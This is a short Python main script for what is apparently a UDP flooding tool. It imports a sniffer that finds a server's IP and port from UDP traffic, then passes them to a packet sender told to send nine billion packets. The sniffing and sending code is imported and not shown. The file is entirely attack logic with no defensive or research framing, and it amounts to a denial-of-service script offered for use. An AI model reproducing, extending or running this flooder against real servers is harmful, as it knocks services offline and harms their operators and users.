from capture.sniffer import ServerSniffer
from network.packet_sender import PacketSender
from config import PACKETS_THRESHOLD, UDP_PORT_RANGE
from utils.logger import logger

def main():
    sniffer = ServerSniffer(port_range=UDP_PORT_RANGE, threshold=PACKETS_THRESHOLD)
    server_ip, server_port = sniffer.start_sniffing()

    if server_ip and server_port:
        sender = PacketSender(server_ip, server_port)
        sender.send_packets(count=9000000000)
    else:
        logger.error("No server detected.")

if __name__ == "__main__":
    main()